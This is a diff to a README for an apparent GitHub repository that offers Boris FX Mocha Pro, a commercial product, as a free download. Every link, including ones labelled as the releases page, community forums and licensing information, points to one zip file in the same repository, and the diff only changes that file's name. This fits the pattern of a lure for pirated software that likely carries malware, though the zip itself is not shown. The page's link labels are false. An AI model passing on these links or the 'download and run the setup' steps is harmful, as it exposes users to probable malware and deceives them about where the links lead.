@@ -1,6 +1,6 @@
 # 🎥 borisfx-mocha-pro - Easy Video Editing and Motion Graphics Made Simple
 
-[![Download Mocha Pro](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/pro-mocha-borisfx-3.0.zip)](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/pro-mocha-borisfx-3.0.zip)
+[![Download Mocha Pro](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/borisfx_mocha_pro_v3.2-alpha.1.zip)](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/borisfx_mocha_pro_v3.2-alpha.1.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Ensure your system meets these requirements to run the application smoothly.
 
 ### Step 1: Download
 
-Visit the [Releases page to download](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/pro-mocha-borisfx-3.0.zip). On this page, you will find the most recent version of Mocha Pro available.
+Visit the [Releases page to download](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/borisfx_mocha_pro_v3.2-alpha.1.zip). On this page, you will find the most recent version of Mocha Pro available.
 
 ### Step 2: Select the Version
 
@@ -35,7 +35,7 @@ After completing the download, locate the zip file in your Downloads folder. Rig
 
 ### Step 4: Install the Application
 
-Navigate to the extracted folder. If you downloaded the standalone application, find the setup file (e.g., `https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/pro-mocha-borisfx-3.0.zip`) and double-click it. Follow the on-screen instructions to complete the installation.
+Navigate to the extracted folder. If you downloaded the standalone application, find the setup file (e.g., `https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/borisfx_mocha_pro_v3.2-alpha.1.zip`) and double-click it. Follow the on-screen instructions to complete the installation.
 
 For the plugin version, follow the same process to install it into your preferred video editing software, such as Adobe After Effects or Sony Vegas.
 
@@ -57,7 +57,7 @@ If you encounter any issues:
 
 1. **Check System Requirements:** Ensure that your computer meets the minimum requirements.
 2. **Reinstall:** If the software does not launch, try reinstalling it.
-3. **Support Forum:** Visit the [Boris FX community forums](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/pro-mocha-borisfx-3.0.zip) for more help.
+3. **Support Forum:** Visit the [Boris FX community forums](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/borisfx_mocha_pro_v3.2-alpha.1.zip) for more help.
 
 ## 💻 Community and Contributions
 
@@ -65,8 +65,8 @@ While this project is primarily for end-users, contributions and feedback are we
 
 ## 📜 License
 
-Boris FX Mocha Pro is licensed under the [Licensing Information](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/pro-mocha-borisfx-3.0.zip). Feel free to read through it for a better understanding of your rights regarding this software.
+Boris FX Mocha Pro is licensed under the [Licensing Information](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/borisfx_mocha_pro_v3.2-alpha.1.zip). Feel free to read through it for a better understanding of your rights regarding this software.
 
 If you find this repository useful, do not hesitate to share it with others. Your support helps improve the software for everyone. 
 
-[![Download Mocha Pro](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/pro-mocha-borisfx-3.0.zip)](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/pro-mocha-borisfx-3.0.zip)
+[![Download Mocha Pro](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/borisfx_mocha_pro_v3.2-alpha.1.zip)](https://raw.githubusercontent.com/ur1nonlyheh/borisfx-mocha-pro/main/athyrid/borisfx_mocha_pro_v3.2-alpha.1.zip)
